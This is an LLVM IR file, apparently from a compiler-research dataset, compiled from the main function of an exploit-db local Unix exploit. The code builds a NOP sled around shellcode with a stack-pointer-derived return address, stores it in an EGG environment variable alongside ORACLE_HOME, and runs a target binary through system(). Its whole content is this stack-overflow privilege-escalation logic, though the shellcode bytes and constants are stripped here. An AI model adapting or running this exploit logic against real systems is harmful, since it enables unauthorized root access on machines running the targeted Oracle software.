; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_21045.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_21045.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFFER = common dso_local global i32 0, align 4
@OFFSET = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [24 x i8] c"Can't allocate memory.\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32* null, align 8
@.str.1 = private unnamed_addr constant [12 x i8] c"ORACLE_HOME\00", align 1
@ORACLE_HOME = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [4 x i8] c"EGG\00", align 1
@BINARY = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i8*, align 8
  %3 = alloca [120 x i8], align 16
  %4 = alloca i64*, align 8
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = load i32, i32* @BUFFER, align 4
  store i32 %9, i32* %6, align 4
  %10 = load i32, i32* @OFFSET, align 4
  store i32 %10, i32* %8, align 4
  %11 = load i32, i32* %6, align 4
  %12 = call i8* @malloc(i32 %11)
  store i8* %12, i8** %1, align 8
  %13 = icmp ne i8* %12, null
  br i1 %13, label %17, label %14

14:                                               ; preds = %0
  %15 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  %16 = call i32 @exit(i32 0) #3
  unreachable

17:                                               ; preds = %0
  %18 = call i32 (...) @get_sp()
  %19 = sub nsw i32 %18, 1420
  %20 = load i32, i32* %8, align 4
  %21 = sub nsw i32 %19, %20
  %22 = sext i32 %21 to i64
  store i64 %22, i64* %5, align 8
  %23 = load i8*, i8** %1, align 8
  store i8* %23, i8** %2, align 8
  %24 = load i8*, i8** %2, align 8
  %25 = bitcast i8* %24 to i64*
  store i64* %25, i64** %4, align 8
  store i32 0, i32* %7, align 4
  br label %26

26:                                               ; preds = %34, %17
  %27 = load i32, i32* %7, align 4
  %28 = load i32, i32* %6, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %37

30:                                               ; preds = %26
  %31 = load i64, i64* %5, align 8
  %32 = load i64*, i64** %4, align 8
  %33 = getelementptr inbounds i64, i64* %32, i32 1
  store i64* %33, i64** %4, align 8
  store i64 %31, i64* %32, align 8
  br label %34

34:                                               ; preds = %30
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 4
  store i32 %36, i32* %7, align 4
  br label %26

37:                                               ; preds = %26
  %38 = load i8*, i8** %1, align 8
  %39 = load i32, i32* %6, align 4
  %40 = sdiv i32 %39, 2
  %41 = load i32, i32* @NOP, align 4
  %42 = call i32 @memset(i8* %38, i32 %40, i32 %41)
  %43 = load i8*, i8** %1, align 8
  %44 = load i32, i32* %6, align 4
  %45 = sdiv i32 %44, 2
  %46 = load i32*, i32** @shellcode, align 8
  %47 = call i32 @strlen(i32* %46)
  %48 = sdiv i32 %47, 2
  %49 = sub nsw i32 %45, %48
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %43, i64 %50
  store i8* %51, i8** %2, align 8
  store i32 0, i32* %7, align 4
  br label %52

52:                                               ; preds = %66, %37
  %53 = load i32, i32* %7, align 4
  %54 = load i32*, i32** @shellcode, align 8
  %55 = call i32 @strlen(i32* %54)
  %56 = icmp slt i32 %53, %55
  br i1 %56, label %57, label %69

57:                                               ; preds = %52
  %58 = load i32*, i32** @shellcode, align 8
  %59 = load i32, i32* %7, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i32, i32* %58, i64 %60
  %62 = load i32, i32* %61, align 4
  %63 = trunc i32 %62 to i8
  %64 = load i8*, i8** %2, align 8
  %65 = getelementptr inbounds i8, i8* %64, i32 1
  store i8* %65, i8** %2, align 8
  store i8 %63, i8* %64, align 1
  br label %66

66:                                               ; preds = %57
  %67 = load i32, i32* %7, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %7, align 4
  br label %52

69:                                               ; preds = %52
  %70 = load i8*, i8** %1, align 8
  %71 = load i32, i32* %6, align 4
  %72 = sub nsw i32 %71, 1
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %70, i64 %73
  store i8 0, i8* %74, align 1
  %75 = load i8*, i8** @ORACLE_HOME, align 8
  %76 = call i32 @setenv(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i8* %75, i32 1)
  %77 = load i8*, i8** %1, align 8
  %78 = call i32 @setenv(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0), i8* %77, i32 1)
  %79 = load i32, i32* @BINARY, align 4
  %80 = call i32 @system(i32 %79)
  ret void
}

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @setenv(i8*, i8*, i32) #1

declare dso_local i32 @system(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
